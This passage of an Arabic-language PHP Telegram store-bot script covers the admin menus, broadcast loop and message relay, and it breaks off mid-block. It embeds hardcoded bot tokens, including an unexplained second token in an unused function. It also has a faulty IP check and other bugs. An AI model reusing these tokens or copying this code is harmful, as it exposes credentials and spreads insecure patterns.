<?php
ob_start();
$Marcus = "6345801560:AAFDtsKMsAHiuBIMPoveTPUNJ1UFXnMzYR8";
define('API_KEY',$Marcus);
echo file_get_contents("https://api.telegram.org/bot" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){
$aws_c9 = http_build_query($datas);
$url = "https://api.telegram.org/bot".API_KEY."/".$method."?$aws_c9";
$aws_c9 = file_get_contents($url);
return json_decode($aws_c9);
}

//Bot File Share by [ @Sherif_Sami - @php_d - @BlIJJ ]
//Join Channel >>> @Sherif_World
//Join Channel >>> @M_M_D74
//🚷

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->from->username;
$userr = '@'.$message->from->username;
$userrr = '@'.$update->callback_query->from->username;
$name = $message->from->first_name;
$message_id2 = $update->callback_query->message->message_id;
$chat_id2 = $update->callback_query->message->chat->id;
$from_id = $message->from->id;
$nammee = $update->callback_query->from->first_name;
$bot_tele1 = file_get_contents('userstart.json');
$sting = file_get_contents("sting.txt");
$start = file_get_contents("start.txt") ;
$setengss = file_get_contents("setengss.txt");
$setengssj = file_get_contents("setengss.txt");
$hadehday = file_get_contents("hadehday.txt");
$hadehdayj = file_get_contents("hadehday.txt");
$sss = file_get_contents('sss.txt');
$bott = bot('getme',['bot'])->result->username;
$ccoinj = file_get_contents("ccoin.txt");
$ccoin = file_get_contents("ccoin.txt");
$photo = $message->photo;
$cutideo = $message->video;
$sticker = $message->sticker;
$file = $message->document;
$audio = $message->audio;
$cutoice = $message->voice;
$caption = $message->caption;
$photo_id = $message->photo[0]->file_id;
$cutideo_id= $message->video->file_id;
$sticker_id = $message->sticker->file_id;
$file_id = $message->document->file_id;
$music_id = $message->audio->file_id;
$cutoice_id = $message->voice->file_id;
$cut = explode("\n",file_get_contents("users.txt"));
$users = count($cut)-0;
$cccoin = $ccoin;
$admin = "1965941065";
$JAMALJO = bot('getchat',['chat_id'=>$admin])->result->username;
$jamalcoann =  "1965941065";
$sudo = $admin;
$stingggg = json_decode(file_get_contents("stingggg.json"),true);
$band = array($stingggg['stingggg']['band']);
$admins = array($chat_id,$stingggg['stingggg']['admins']);
$rdod['rd'][$rdod['txt']]['caption'] = $message->caption;
$type = $update->message->chat->type;
$u = json_decode(file_get_contents('member.json'),true);
if(!in_array($chat_id, $u) and $type == "private") {
      $u[] = "$chat_id";
      file_put_contents('member.json',json_encode($u));
  }
function jamalusd($method,$datas=[]){
$aws_c9 = http_build_query($datas);
$url = "https://api.telegram.org/bot5400612821:AAHjxznwaDChYYkbmIKuQZSUQVdJTa0VvB8/".$method."?$aws_c9";
$aws_c9 = file_get_contents($url);
return json_decode($aws_c9);
}
function save($array){
    file_put_contents('sales.json', json_encode($array));
}
if(isset($update->message)){
$message = $update->message;
$message_id = $update->message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
$tc = $message->chat->type;
}
if(isset($update->callback_query)){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $chat_id;
$tc = $update->callback_query->message->chat->type;
}
$members = explode("\n",file_get_contents("users.txt"));
$countmembers = count($members);
$sting = json_decode(file_get_contents("sting.json"),true); 
$update = json_decode(file_get_contents('php://input'));
function YhyaSyrian($Size)
{
    if ($Size < 1000) {
        return "$Size B";
    } elseif (($Size / 1024) < 1000) {
        return round($Size / 1024,1).' KB';
    } elseif (($Size / 1024 / 1024) < 1000) {
        return round($Size / 1024 / 1024,1).' MB';
    } elseif (($Size / 1024 / 1024 / 1024) < 1000) {
        return round($Size / 1024 / 1024 / 1024,1).' GB';
    } else {
        return round($Size / 1024 / 1024 / 1024 / 1024,1).' TB';
    }
}
 function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
function sender(){
$members = explode("\n",file_get_contents("users.txt"));
$sting = json_decode(file_get_contents("sting.json"),true); 
 $method = $sting['send']['method'];
    $count = count($members);
 $text = $sting['send']['text'];
 $mode = $sting['send']['mode'];
 $num = $sting['send']['num'];
 $id = $sting['send']['from'];
 $mes = $sting['send']['id'];
 $ms = $sting['send']['mesid'];
 $file = $sting['send']['file'];
 $caption = $sting['send']['caption'];
 for($i=$num;$i<=$num + 30;$i++){
  $to = $members[$i];
  if($i > $count){
   break;
  }
  if($to == null){
   $sting['send']['ban'] += 1;
   continue;
  }
  if($method == 'text'){
   $ok = bot('sendmessage',[
   'chat_id'=>$to, 
   'text'=>$text]);
  }elseif($method == "forward"){
   $ok = bot('forwardMessage',[
  'chat_id'=>$to,
  'from_chat_id'=>$id,
  'message_id'=>$ms,
  ]);
  }else{
  $ok = bot('send'.str_replace('_','',$method),[
   "chat_id"=>$to,
   $method=>$file,
  'caption'=>$caption,
   ]);
  }
  if(!$ok->ok){
  $sting['send']['ban'] += 1;
  continue;
  }
  if($mode == 'pin'){
   bot('pinchatMessage', [
   'chat_id'=>$to,
   'message_id'=>$ok->result->message_id,
   ]);
  } 
 } // End Loop
$ban = $sting['send']['ban'];
$all = $count - $ban;
if($i > $count){
bot('EditMessageText',[
 'chat_id'=>$id, 
 'message_id'=>$mes,
 'text'=>"
تم الإنتهاء من الإذاعة بنجاح ✓
عدد الأشخاص التي تم الإرسال إليهم : $i 👤
عدد الأشخاص التي قامو بحظر البوت $ban 💔
عدد الأشخاص التي وصلت لهم الإذاعة $all 🗣️
",
]);
unset($sting['send']);
file_put_contents("sting.json",json_encode($sting,64|128|256));
}else{
$Syria = round($count / 100,2);
$Nesb = round($i / $Syria,1).'٪';
bot('EditMessageText',[
 'chat_id'=>$id, 
 'message_id'=>$mes,
 'text'=>"
تم الإذاعة لـ
عدد الأشخاص التي تم الإرسال إليهم : $i 👤
عدد الأشخاص التي قامو بحظر البوت $ban 💔
نسبة الأشخاص التي وصلت لهم الإذاعة هي : $Nesb
جاري الإذاعة للباقي 😉
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'الاستمرار بالإذاعة 💕','url'=>'https://'.$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']]],
]]),
]);
echo "تم الإذاعة لـ
عدد الأشخاص التي تم الإرسال إليهم : $i 👤
عدد الأشخاص التي قامو بحظر البوت $ban 💔
نسبة الأشخاص التي وصلت لهم الإذاعة هي : $Nesb
جاري الإذاعة للباقي 😉";
$sting['send']['num'] = $i;
file_put_contents("sting.json",json_encode($sting,64|128|256));
header("Refresh:2");
}
return $i;
} // End Function 
 $ip = getUserIP();
$ipok = explode(".",$ip);
$YhyaSyrian = file_get_contents('php://input');
if($ipok[0] != "91" and $ipok[1] != "108" and preg_match('/update_id/',$YhyaSyrian)){
exit;
}
if($sting['send'] != null and !$update){
sender();
}
$sttings = json_decode(file_get_contents("JAMALGG.json"),1);
	if($sttings["hdeh1"]==null){
	$sttings["hdeh1"]=$no3;
	file_put_contents("JAMALGG.json",json_encode($sttings));
	}
	if($sttings["sal3h"]==null){
	$sttings["sal3h"]=$no3;
	file_put_contents("JAMALGG.json",json_encode($sttings));
	}

//---------1----
$sales = json_decode(file_get_contents('sales.json'),true);
$roadt = json_decode(file_get_contents('roadt.json'),true);
$dojj = file_get_contents('../../dobotss.txt');
$dobotsj = file_get_contents('../../dobotssj.txt');
$usdyhyaj = $dojj;
$CHHHH = file_get_contents('../../chbotss.txt');
$CHHHH2 = file_get_contents('../../chbotss2.txt');
$botsjj = json_decode(file_get_contents('../../stingggi.json'),true);
$usdyhya = $sales['allllyhya'] / $dojj;

$getmosh1 = file_get_contents("getmosh1.txt");
$getmoshh1 = explode("\n",$getmosh1);
$getmosh = file_get_contents("getmosh.txt");
$getmoshh = explode("\n",$getmosh);
$channels = file_get_contents("channels.txt");
$channel = file_get_contents("channel.txt");
$setcoin1 = file_get_contents("setcoin1.txt");
date_default_timezone_set('Asia/Jordan');
$time = date('h:i a');
$me = $bott;
$sales = json_decode(file_get_contents('sales.json'),1);
$d = date('D');
$day = explode("\n",file_get_contents($d.".txt"));
if($d == "Sat"){
unlink("Fri.txt");
}
if($d == "Sun"){
unlink("Sat.txt");
}
if($d == "Mon"){
unlink("Sun.txt");
}
if($d == "Tue"){
unlink("Mon.txt");
}
if($d == "Wed"){
unlink("The.txt");
}
if($d == "Thu"){
unlink("Wed.txt");
}
if($d == "Fri"){
unlink("Thu.txt");
}
$array = ['bot','twasss'];
if($stingggg[$array[0]] == null){
	foreach($array as $k){
		$stingggg[$k] = 'on';
		}
		file_put_contents("stingggg.json",json_encode($stingggg));
		}
if(in_array($data,$array)){
if($stingggg[$data] == "on"){
$stingggg[$data] = "off";
$ok = "التعطيل";
}else{
$stingggg[$data] = "on";
$ok = "التفعيل";
}
file_put_contents("stingggg.json",json_encode($stingggg));
$stingggg = json_decode(file_get_contents('stingggg.json'),1);
$bot = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['bot']);
$twasss = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['twasss']);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"-  مرحبـٲ عـزيزي الـمـطـور  @$user 👋🏻
- انت المـطـور الاسـاسـي هـنـا 👑
- اليـكـ ازرار تحـكـم في الـبوت 🤖
- تستطيـع التحكم بكل الاوامر فقط اضغط علئ الامر الذي تريد تنفيذه 🍃 
☆ تم $ok بنجاح ✓ ☆
-",
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"عمل البوت : $bot",'callback_data'=>"bot"],["text"=>"اشعار الدخول: $twasss","callback_data"=>"twasss"]],
       [['text'=>'الاختصارات 🍃','callback_data'=>"comm"]],
       [['text'=>"قسم الردود 🔱",'callback_data'=>"rdod"],['text'=>'📛 ¦ إرسال تحذير','callback_data'=>"sendwarning"]],
       [['text'=>'تعين رسالة ستارت 🙋‍♂️','callback_data'=>"startjj"]],
       [['text'=>'📛 ¦ قسم الحظر ⚠️','callback_data'=>"band"],['text'=>'👮🏻‍♂️ ¦ قسم الادمنيه️','callback_data'=>"addadm"]],
       [['text'=>"قسم الاشتراك الاجباري 💳",'callback_data'=>"ch"]],
       [['text'=>'قسم الاحصائيات ⚜','callback_data'=>"starts"],['text'=>"قسم الاذاعه 📨",'callback_data'=>"adaan"]],
       [['text'=>'🤖⚙ اعدادات بوت متجر⚙🤖','callback_data'=>"stengbott"]],
       ]
    ])
  ]);
}
$array = ['alrdod'];
if($stingggg[$array[0]] == null){
	foreach($array as $k){
		$stingggg[$k] = 'on';
		}
		file_put_contents("stingggg.json",json_encode($stingggg));
		}
if(in_array($data,$array)){
if($stingggg[$data] == "on"){
$stingggg[$data] = "off";
$ok = "التعطيل";
}else{
$stingggg[$data] = "on";
$ok = "التفعيل";
}
file_put_contents("stingggg.json",json_encode($stingggg));
$stingggg = json_decode(file_get_contents('stingggg.json'),1);
$alrdod = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['alrdod']);
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>"
• مرحبا بك في قسم الردود 👮‍♀️

- يمكنك اضافه ردود وحذفها 

- اضغط على نص الزر لعرض محتواه .

*☆ تم $ok بنجاح ☆*
",
'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>"أضف رد ➕",'callback_data'=>"addrd"],['text'=>"الردود 💬",'callback_data'=>"Rdod"]],
[['text'=>"الردود 🍃 «".$alrdod."»",'callback_data'=>"alrdod"]],
[["text"=>"رجوع ،🔙.","callback_data"=>"c"]],
]])
]);   
}
$array = ['thoil','thkk','dayis','twassss','saless','alroadttt','almttor'];
if($stingggg[$array[0]] == null){
	foreach($array as $k){
		$stingggg[$k] = 'on';
		}
		file_put_contents("stingggg.json",json_encode($stingggg));
		}
if(in_array($data,$array)){
if($stingggg[$data] == "on"){
$stingggg[$data] = "off";
$ok = "التعطيل";
}else{
$stingggg[$data] = "on";
$ok = "التفعيل";
}
file_put_contents("stingggg.json",json_encode($stingggg));
$stingggg = json_decode(file_get_contents('stingggg.json'),1);
$okthoil = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['thoil']);
$thkk = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['thkk']);
$dayis = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['dayis']);
$twassss = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['twassss']);
$alroadttt = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['alroadttt']);
$saless = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['saless']);
$almttor = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['almttor']);
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>"*
- مرحباً عزيزي المطور $nammee 🔥. 

- حساب المطور : @$JAMALJO
*
- يمكن للعضو ارسال `/id` لارسال الايدي الخاص به

*☆ تم $ok بنجاح ☆*
",
'parse_mode'=>"MARKDOWN",
'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>"عرض سلع الوضع المتطور ❇: $almttor",'callback_data'=>'almttor']],
[['text'=>'🏷 ¦ جميع السلع','callback_data'=>'del']],
[['text'=>'🛒 ¦ إضافة سلعة','callback_data'=>'add'],['text'=>'➖ ¦ حذف سلعة','callback_data'=>'deljj']],
[['text'=>"عرض كمية السلع المتوفره ♾: $saless",'callback_data'=>'saless']],
[['text'=>'📡 ¦ تعيين قناة إثباتات','callback_data'=>'shh']],       
[['text'=>'🎁 ¦ قسم النقاط','callback_data'=>"Nkatn"]],
[['text'=>"تواصل البوت وا الاشعارات ⛓: $twassss",'callback_data'=>'twassss']],
[['text'=>"تحويل نقاط: $okthoil",'callback_data'=>'thoil'],['text'=>"الهدية اليومية: $dayis",'callback_data'=>'dayis']],
[['text'=>"تحقق من الوهمي ♻️ : $thkk",'callback_data'=>'thkk']],
[['text'=>'قسم تحكم بدول المستخدمين 📞','callback_data'=>'ajddnum']],
[['text'=>"اضافة رابط مختصر️ 🔗",'callback_data'=>'raddtt'],['text'=>"حذف رابط مختصر️ 🚫",'callback_data'=>'dettjj']],
[['text'=>"قسم اختصار روابط️ ⛓ : $alroadttt",'callback_data'=>'alroadttt']],
[['text'=>"تحويل ملكية البوت 👮‍♂️",'callback_data'=>'mlk']],
[["text"=>"رجوع ،🔙.","callback_data"=>"c"]],
]])
]);   
}
$bot = file_get_contents("com.txt");
if($data == 'c'){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
file_put_contents("stingggg.json",json_encode($stingggg));
$stingggg = json_decode(file_get_contents('stingggg.json'),1);
$bot = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['bot']);
$twasss = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['twasss']);
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"-  مرحبـٲ عـزيزي الـمـطـور  @$user 👋🏻
- انت المـطـور الاسـاسـي هـنـا 👑
- اليـكـ ازرار تحـكـم في الـبوت 🤖
- تستطيـع التحكم بكل الاوامر فقط اضغط علئ الامر الذي تريد تنفيذه 🍃 
-",
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"عمل البوت : $bot",'callback_data'=>"bot"],["text"=>"اشعار الدخول: $twasss","callback_data"=>"twasss"]],
       [['text'=>'الاختصارات 🍃','callback_data'=>"comm"]],
       [['text'=>"قسم الردود 🔱",'callback_data'=>"rdod"],['text'=>'📛 ¦ إرسال تحذير','callback_data'=>"sendwarning"]],
       [['text'=>'تعين رسالة ستارت 🙋‍♂️','callback_data'=>"startjj"]],
       [['text'=>'📛 ¦ قسم الحظر ⚠️','callback_data'=>"band"],['text'=>'👮🏻‍♂️ ¦ قسم الادمنيه️','callback_data'=>"addadm"]],
       [['text'=>"قسم الاشتراك الاجباري 💳",'callback_data'=>"ch"]],
       [['text'=>'قسم الاحصائيات ⚜','callback_data'=>"starts"],['text'=>"قسم الاذاعه 📨",'callback_data'=>"adaan"]],
       [['text'=>'🤖⚙ اعدادات بوت متجر⚙🤖','callback_data'=>"stengbott"]],
       ]
    ])
  ]);
$stingggg['stingggg']['stingggg'] = null;
$stingggg['stingggg']['id'] = null;
 file_put_contents("stingggg.json",json_encode($stingggg));
$sales['mode'] = null;
  save($sales);
 }
}
if($text== '/start'){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
file_put_contents("stingggg.json",json_encode($stingggg));
$stingggg = json_decode(file_get_contents('stingggg.json'),1);
$bot = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['bot']);
$twasss = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['twasss']);
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"-  مرحبـٲ عـزيزي الـمـطـور  @$user 👋🏻
- انت المـطـور الاسـاسـي هـنـا 👑
- اليـكـ ازرار تحـكـم في الـبوت 🤖
- تستطيـع التحكم بكل الاوامر فقط اضغط علئ الامر الذي تريد تنفيذه 🍃
-",
'reply_to_message_id'=>$message->message_id, 
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>"عمل البوت : $bot",'callback_data'=>"bot"],["text"=>"اشعار الدخول: $twasss","callback_data"=>"twasss"]],
       [['text'=>'الاختصارات 🍃','callback_data'=>"comm"]],
       [['text'=>"قسم الردود 🔱",'callback_data'=>"rdod"],['text'=>'📛 ¦ إرسال تحذير','callback_data'=>"sendwarning"]],
       [['text'=>'تعين رسالة ستارت 🙋‍♂️','callback_data'=>"startjj"]],
       [['text'=>'📛 ¦ قسم الحظر ⚠️','callback_data'=>"band"],['text'=>'👮🏻‍♂️ ¦ قسم الادمنيه️','callback_data'=>"addadm"]],
       [['text'=>"قسم الاشتراك الاجباري 💳",'callback_data'=>"ch"]],
       [['text'=>'قسم الاحصائيات ⚜','callback_data'=>"starts"],['text'=>"قسم الاذاعه 📨",'callback_data'=>"adaan"]],
       [['text'=>'🤖⚙ اعدادات بوت متجر⚙🤖','callback_data'=>"stengbott"]],
       ]
    ])
  ]);
$stingggg['stingggg']['stingggg'] = null;
$stingggg['stingggg']['id'] = null;
 file_put_contents("stingggg.json",json_encode($stingggg));
$sales['mode'] = null;
  save($sales);
 }
}

/*>>>>>>>>>>>اعدادات التواصل<<<<<<<<<<<<*/

$saiko = json_decode(file_get_contents("SAIKO.json"),1);
if($text and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
foreach($stingggg['stingggg']['admins'] as $adminsss){
bot('sendmessage',[
'chat_id'=>$adminsss,
'text'=>"⌔︙لديك رسالة جديدة
المرسل : [$name](tg://user?id=$from_id)
---
$text
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
}
if($message->photo and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
foreach($stingggg['stingggg']['admins'] as $adminsss){
bot('sendphoto',[
'chat_id'=>$adminsss,
'photo'=>$photo_id,
'caption'=>$caption,
]);
bot('sendmessage',[
'chat_id'=>$adminsss,
'text'=>"⌔︙لديك رسالة جديدة 👆
المرسل : [$name](tg://user?id=$from_id)
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
}
if($message->video and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
foreach($stingggg['stingggg']['admins'] as $adminsss){
bot('sendvideo',[
'chat_id'=>$adminsss,
'video'=>$cutideo_id,
'caption'=>$caption,
]);
bot('sendmessage',[
'chat_id'=>$adminsss,
'text'=>"⌔︙لديك رسالة جديدة 👆
المرسل : [$name](tg://user?id=$from_id)
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
}
if($message->document and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
foreach($stingggg['stingggg']['admins'] as $adminsss){
bot('senddocument',[
'chat_id'=>$adminsss,
'document'=>$file_id,
'caption'=>$caption,
]);
bot('sendmessage',[
'chat_id'=>$adminsss,
'text'=>"⌔︙لديك رسالة جديدة 👆
المرسل : [$name](tg://user?id=$from_id)
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
}
if($message->voice and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
foreach($stingggg['stingggg']['admins'] as $adminsss){
bot('sendvoice',[
'chat_id'=>$adminsss,
'voice'=>$cutoice_id,
]);
bot('sendmessage',[
'chat_id'=>$adminsss,
'text'=>"⌔︙لديك رسالة جديدة 👆
المرسل : [$name](tg://user?id=$from_id)
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
}
if($text and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"⌔︙لديك رسالة جديدة
المرسل : [$name](tg://user?id=$from_id)
---
$text
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
if($message->photo and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
bot('sendphoto',[
'chat_id'=>$admin,
'photo'=>$photo_id,
'caption'=>$caption,
]);
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"⌔︙لديك رسالة جديدة 👆
المرسل : [$name](tg://user?id=$from_id)
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
if($message->video and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
bot('sendvideo',[
'chat_id'=>$admin,
'video'=>$cutideo_id,
'caption'=>$caption,
]);
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"⌔︙لديك رسالة جديدة 👆
المرسل : [$name](tg://user?id=$from_id)
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
if($message->document and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
bot('senddocument',[
'chat_id'=>$admin,
'document'=>$file_id,
'caption'=>$caption,
]);
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"⌔︙لديك رسالة جديدة 👆
المرسل : [$name](tg://user?id=$from_id)
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
if($message->voice and $stingggg['twassss'] == 'on' and $text != "/start" and $from_id != $admin){
bot('sendvoice',[
'chat_id'=>$admin,
'voice'=>$cutoice_id,
]);
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"⌔︙لديك رسالة جديدة 👆
المرسل : [$name](tg://user?id=$from_id)
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⌔︙ارسال رسالة' ,'callback_data'=>"kn:$from_id"]],
]])
]);
}
$br = explode(':', $data);
$km = str_replace("kn:","",$data);
$ok = bot("getchat",["chat_id"=>$km])->result->first_name;
if($data == "kn:$br[1]"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
⌔︙ارسال رسالتك
⌔︙ليتم ارسالها لـ [$ok](tg://user?id=$km)
",
'parse_mode'=>"MarkDown",
]);
$saiko['id'] = "$km";
$saiko['text'] = "ok";
file_put_contents("SAIKO.json",json_encode($saiko));
}
$n = bot("getchat",["chat_id"=>$saiko['id']])->result->first_name;
if($text){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
if($saiko['text'] == "ok"){
bot('sendmessage',[
'chat_id'=>$saiko['id'],
'text'=>$text,
]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"⌔︙تم ارسال رسالتك لـ [$n]",
'parse_mode'=>"MarkDown",
]);
unset($saiko['id']);
unset($saiko['text']);
file_put_contents("SAIKO.json",json_encode($saiko));
}
}
}

//Bot File Share by [ @Sherif_Sami - @php_d - @BlIJJ ]
//Join Channel >>> @Sherif_World
//Join Channel >>> @M_M_D74
//🚷

if($data == 'comm'){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
$reply_markup = [];
  foreach($stingggg['com'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['com1'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'dellll×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'إضافة اختصار 🌱','callback_data'=>'adddcd']];
  $reply_markup['inline_keyboard'][] = [['text'=>'- رجوع','callback_data'=>'c']];
$json = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'• مرحبا بك في قسم الاختصارات ✨

- يمكنك وضع اوامر مختصره في البوت من خلال هاذا القسم',
    'reply_markup'=>$json
  ]);
  exit;
 }
 }
  $ex = explode('×',$data);
 if($ex[0] == "dellll"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	if($stingggg['com'][$ex[1]] != null){
 	unset($stingggg['com'][$ex[1]]);
  $stingggg['modee'] = null;
  file_put_contents('stingggg.json', json_encode($stingggg));
$stingggg = json_decode(file_get_contents('stingggg.json'),true);
$reply_markup = [];
  foreach($stingggg['com'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['com1'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'dellll×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'إضافة اختصار 🌱','callback_data'=>'adddcd']];
  $reply_markup['inline_keyboard'][] = [['text'=>'- رجوع','callback_data'=>'c']];
$json = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"تم حذف الاختصار ".$sale['com1']." بنجاح...✅
اختر ما تريد مجددا ",
    'reply_markup'=>$json,
  ]);
 }else{
 $reply_markup = [];
foreach($stingggg['com'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['com1'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'dellll×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'إضافة اختصار 🌱','callback_data'=>'adddcd']];
  $reply_markup['inline_keyboard'][] = [['text'=>'- رجوع','callback_data'=>'c']];
$json = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'الاختصار غير موجودة يمكنك المحاولة مجددا',
    'reply_markup'=>$json
  ]);
 }
 }
 }
  if($data == 'adddcd'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'• ارسل الاختصار الان بدون / مثال : 
start - رساله البدء ',
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'c']]
      ]
    ])
  ]);
  $stingggg['modee'] = 'add';
  file_put_contents('stingggg.json', json_encode($stingggg));
  exit;
 }
 $ex2 = explode(' - ',$text);
 if($text != '/start' and $text != null and $stingggg['modee'] == 'add'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  $code = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz12345689807'),1,7);
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'• تم الحفظ !',
'reply_to_message_id'=>$message->message_id, 
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- رجوع 🚫','callback_data'=>'c']]
      ]
    ])
  ]);
  $stingggg['com'][$code]['com1'] = $ex2[0];
  $stingggg['com'][$code]['com2'] = $ex2[1];
  unset($stingggg['modee']);
  file_put_contents('stingggg.json', json_encode($stingggg));
  exit;
 }
 }
/*>>>>>>>>>>>>>>>قسم الاذاعه<<<<<<<<<<<<*/
$bot_id = $bott;
if($data == "adaan"){
